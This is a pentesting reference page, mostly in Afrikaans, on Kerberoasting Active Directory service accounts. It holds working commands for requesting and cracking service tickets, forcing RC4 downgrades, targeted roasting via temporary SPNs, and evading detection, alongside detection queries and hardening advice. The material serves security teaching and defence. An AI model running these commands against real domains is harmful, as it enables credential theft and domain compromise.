# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting fokus op die verkryging van TGS-tickets, spesifiek dié wat verband hou met dienste wat onder gebruikersrekeninge in Active Directory (AD) bedryf word, met uitsluiting van rekenaarrekeninge. Die enkripsie van hierdie tickets gebruik sleutels wat van gebruikerswagwoorde afgelei word, wat offline credential cracking moontlik maak. Die gebruik van ’n gebruikersrekening as ’n diens word aangedui deur ’n nie-leë ServicePrincipalName (SPN)-eienskap.

Enige geauthentiseerde domeingebruiker kan TGS-tickets aanvra, dus is geen spesiale voorregte nodig nie.<sup>[[4]](#references)[[5]](#references)</sup>

### Sleutelpunte

- Teiken TGS-tickets vir dienste wat onder gebruikersrekeninge loop (d.w.s. rekeninge met SPN gestel; nie rekenaarrekeninge nie).
- Tickets word geënkripteer met ’n sleutel wat van die diensrekening se wagwoord afgelei is en kan offline gekraak word.
- Geen verhoogde voorregte word vereis nie; enige geauthentiseerde rekening kan TGS-tickets aanvra.

> [!WARNING]
> Die meeste publieke tools verkies om RC4-HMAC (etype 23)-dienskaartjies aan te vra omdat hulle vinniger as AES gekraak kan word. RC4 TGS-hashes begin met `$krb5tgs$23$*`, AES128 met `$krb5tgs$17$*`, en AES256 met `$krb5tgs$18$*`. Baie omgewings beweeg egter na slegs AES. Moenie aanvaar dat slegs RC4 relevant is nie.
> Vermy ook “spray-and-pray” roasting. Rubeus se verstek-kerberoast kan navraag doen oor en tickets aanvra vir alle SPNs, en is raserig. Enumerate en teiken eers interessante principals.

### Geheime van diensrekeninge & Kerberos-kripto-koste

Baie dienste loop steeds onder gebruikersrekeninge met handmatig bestuurde wagwoorde. Die KDC enkripteer dienskaartjies met sleutels wat van hierdie wagwoorde afgelei is en gee die ciphertext aan enige geauthentiseerde principal, sodat kerberoasting onbeperkte offline pogings sonder lockouts of DC-telemetrie moontlik maak. Die enkripsiemo­dus bepaal die cracking-begroting:

| Modus | Sleutelafleiding | Enkripsietipe | Ongeveer RTX 5090-deurset* | Aantekeninge |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 met 4,096 iterasies en ’n per-principal salt wat uit die domein + SPN gegenereer word | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 miljoen pogings/s | Salt blokkeer rainbow tables, maar maak steeds vinnige cracking van kort wagwoorde moontlik. |
| RC4 + NT hash | Enkele MD4 van die wagwoord (ongesoute NT-hash); Kerberos meng slegs ’n 8-grepe confounder per ticket in | etype 23 (`$krb5tgs$23$`) | ~4.18 **miljard** pogings/s | ~1000× vinniger as AES; attackers forseer RC4 wanneer `msDS-SupportedEncryptionTypes` dit toelaat. |

*Benchmarks van Chick3nman soos aangehaal in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4 se confounder randomiseer slegs die keystream; dit voeg nie werk per poging by nie. Tensy diensrekeninge op random secrets (gMSA/dMSA, masjienrekeninge of vault-bestuurde strings) staatmaak, word die kompromitteringspoed uitsluitlik deur die GPU-begroting bepaal. Die afdwinging van slegs AES-etypes verwyder die downgrade van ’n miljard pogings per sekonde, maar swak menslike wagwoorde val steeds voor PBKDF2.<sup>[[3]](#references)</sup>

### Aanval

#### Linux

’n Praktiese end-tot-end-voorbeeld wat NetExec gebruik om roastable tickets aan te vra en Hashcat te gebruik om hulle te crack, is in verwysing [1] beskikbaar.<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Veel-funksie-nutsmiddels, insluitend kerberoast-kontroles:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerate kerberoastable gebruikers
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Vra vir TGS en dump uit geheue
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tegniek 2: Outomatiese gereedskap
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> ’n TGS request genereer Windows Security Event 4769 (A Kerberos service ticket was requested).

### OPSEC en AES-only omgewings

- Request RC4 doelbewus vir rekeninge sonder AES:
- Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES te enumereer en versoek RC4 service tickets.
- Rubeus: `/tgtdeleg` met kerberoast aktiveer ook RC4 requests waar moontlik.<sup>[[6]](#references)</sup>
- Roast AES-only-rekeninge in plaas daarvan om stilweg te faal:
- Rubeus: `/aes` enumereer rekeninge met AES geaktiveer en versoek AES service tickets (etype 17/18).
- As jy reeds ’n TGT het (PTT of vanaf ’n .kirbi), kan jy `/ticket:<blob|path>` met `/spn:<SPN>` of `/spns:<file>` gebruik en LDAP oorslaan.
- Teikening, throttling en minder geraas:
- Gebruik `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` en `/jitter:<1-100>`.
- Filter vir waarskynlike swak passwords met `/pwdsetbefore:<MM-dd-yyyy>` (ouer passwords), of teiken privileged OUs met `/ou:<DN>`.<sup>[[8]](#references)</sup>

Voorbeelde (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Volharding / Misbruik

As jy beheer oor ’n rekening het of dit kan wysig, kan jy dit kerberoastable maak deur ’n SPN by te voeg:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Gradeer ’n rekening af om RC4 te aktiveer vir makliker cracking (vereis skryftoestemmings op die teikenobjek):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Gerigte Kerberoast via GenericWrite/GenericAll oor 'n gebruiker (tydelike SPN)

Wanneer BloodHound wys dat jy beheer oor 'n gebruikerobjek het (bv. GenericWrite/GenericAll), kan jy daardie spesifieke gebruiker betroubaar “targeted-roast”, selfs al het hulle tans geen SPNs nie:<sup>[[9]](#references)</sup>

- Voeg 'n tydelike SPN by die beheerde gebruiker om dit roastable te maak.
- Versoek 'n TGS-REP wat met RC4 (etype 23) geënkripteer is vir daardie SPN om cracking te bevoordeel.
- Crack die `$krb5tgs$23$...` hash met hashcat.
- Verwyder die SPN om die voetspoor te verklein.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py outomatiseer add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Kraak die uitvoer met hashcat se outomatiese opsporing (modus 13100 vir `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Opsporingsnotas: die byvoeging/verwydering van SPNs veroorsaak directory-veranderinge (Event ID 5136/4738 op die teiken gebruiker), en die TGS request genereer Event ID 4769. Oorweeg throttling en prompt-opruiming.

Jy kan nuttige tools vir kerberoast attacks hier vind: https://github.com/nidem/kerberoast

As jy hierdie fout vanaf Linux kry: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, is dit weens plaaslike tydskeefheid. Sinkroniseer met die DC:

- `ntpdate <DC_IP>` (verouderd op sommige distros)
- `rdate -n <DC_IP>`

### Kerberoast sonder ’n domeinrekening (AS-requested STs)

In September 2022 het Charlie Clark gewys dat, indien ’n principal nie pre-authentication vereis nie, dit moontlik is om ’n service ticket via ’n vervaardigde KRB_AS_REQ te verkry deur die sname in die request body te verander, wat effektief ’n service ticket in plaas van ’n TGT verkry. Dit weerspieël AS-REP roasting en vereis nie geldige domein credentials nie.

Sien besonderhede: Semperis se write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Jy moet ’n lys gebruikers verskaf, want sonder geldige credentials kan jy nie LDAP met hierdie tegniek query nie.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Verwant

As jy AS-REP roastable users teiken, sien ook:

{{#ref}}
asreproast.md
{{#endref}}

### Opsporing

Kerberoasting kan stealthy wees. Soek vir Event ID 4769 vanaf DCs en pas filters toe om geraas te verminder:

- Sluit diensnaam `krbtgt` en diensname wat met `$` eindig uit (rekenaarrekeninge).
- Sluit versoeke vanaf masjienrekeninge (`*$$@*`) uit.
- Slegs suksesvolle versoeke (Failure Code `0x0`).
- Monitor enkripsietipes: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moenie slegs op `0x17` waarsku nie.

Voorbeeld van PowerShell-triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Bykomende idees:

- Stel ’n basislyn vir normale SPN-gebruik per gasheer/gebruiker op; waarsku oor groot uitbarstings van onderskeie SPN-versoeke vanaf ’n enkele principal.
- Merk ongewone RC4-gebruik in AES-versterkte domeine.

### Versagting / Verharding

- Gebruik gMSA/dMSA- of masjienrekeninge vir dienste. Bestuurde rekeninge het ewekansige wagwoorde van 120+ karakters en roteer dit outomaties, wat offline cracking onprakties maak.<sup>[[7]](#references)</sup>
- Dwing AES op diensrekeninge af deur `msDS-SupportedEncryptionTypes` op slegs AES te stel (desimaal 24 / heksadesimaal 0x18), en roteer dan die wagwoord sodat AES-sleutels afgelei word.<sup>[[7]](#references)</sup>
- Waar moontlik, deaktiveer RC4 in jou omgewing en monitor vir pogings om RC4 te gebruik. Op DCs kan jy die `DefaultDomainSupportedEncTypes`-registerwaarde gebruik om verstekke te bepaal vir rekeninge waarvoor `msDS-SupportedEncryptionTypes` nie gestel is nie. Toets deeglik.
- Verwyder onnodige SPNs uit gebruikerrekeninge.<sup>[[7]](#references)</sup>
- Gebruik lang, ewekansige wagwoorde vir diensrekeninge (25+ karakters) indien bestuurde rekeninge nie haalbaar is nie; verbied algemene wagwoorde en doen gereeld oudits.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in die praktyk](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Laetegnologie-aanvalle met groot impak vanaf verouderde Kerberos-kriptografie (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Hoe val jy Kerberos aan?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Versoek van RC4-geënkripteerde TGS wanneer AES geaktiveer is](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft se leiding om Kerberoasting te help versag](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast-opdragdokumentasie](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL-geloofsbriewe → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Nuwe aanvalspaaie? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
